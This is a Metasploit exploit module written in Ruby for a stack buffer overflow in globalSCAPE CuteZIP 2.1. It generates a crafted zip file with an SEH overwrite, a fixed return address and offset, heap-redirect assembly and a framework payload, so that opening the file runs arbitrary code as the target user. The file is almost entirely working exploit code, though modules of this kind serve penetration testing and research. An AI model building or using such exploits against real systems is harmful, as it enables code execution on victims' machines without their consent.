##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
require 'rex/zip'
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'globalSCAPE CuteZIP Stack Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack-based buffer overflow vulnerability in version 2.1
                of CuteZIP.
 
                In order for the command to be executed, an attacker must convince the target user
                to open a specially crafted zip file with CuteZIP. By doing so, an attacker can
                execute arbitrary code as the target user.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'C4SS!0 G0M3S <Louredo_[at]hotmail.com>', # Initial discovery, poc
                    'juan vazquez' # Metasploit
                ],
            'References'     =>
                [
                    [ 'BID', '46375' ],
                    [ 'EDB', '16162' ],
                ],
            'Platform'          => [ 'win' ],
            'Payload'           =>
                {
                    'BadChars'    => "",
                    'DisableNops' => true,
                    'Space' => 3000 # Limit due to the heap chunk size where the payload is stored
                },
            'Targets'        =>
                [
                    [
                        # Tested successfully on:
                        # * Windows XP SP3
                        # * Windows Vista SP2
                        # * Windows 7 SP1
                        # (NO DEP)
                        'CuteZIP 2.1 / Windows Universal',
                        {
                            'Ret'         => 0x0040112F, # pop, pop, ret from CuteZIP.exe
                            'Offset'      => 1148,
                            'Nops'        => 398
                        }
                    ],
                ],
            'DisclosureDate' => 'Feb 12 2011',
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ true, 'The output file name.', 'msf.zip'])
            ], self.class)
 
    end
 
    def exploit
 
        redirect_heap = <<-ASM
            popad
            popad
            popad
            push ecx
            pop eax
            call eax
        ASM
 
        crafted_file = rand_text(target['Offset'])
        crafted_file << generate_seh_record(target.ret)
        crafted_file << Metasm::Shellcode.assemble(Metasm::Ia32.new, redirect_heap).encode_string
        crafted_file << make_nops(1) * target['Nops']
        crafted_file << payload.encoded
 
        # Create the file
        zip = Rex::Zip::Archive.new
        xtra = rand_text(4)
        zip.add_file(crafted_file, xtra)
 
        print_status("Creating '#{datastore['FILENAME']}' file...")
        file_create(zip.pack)
    end
 
end

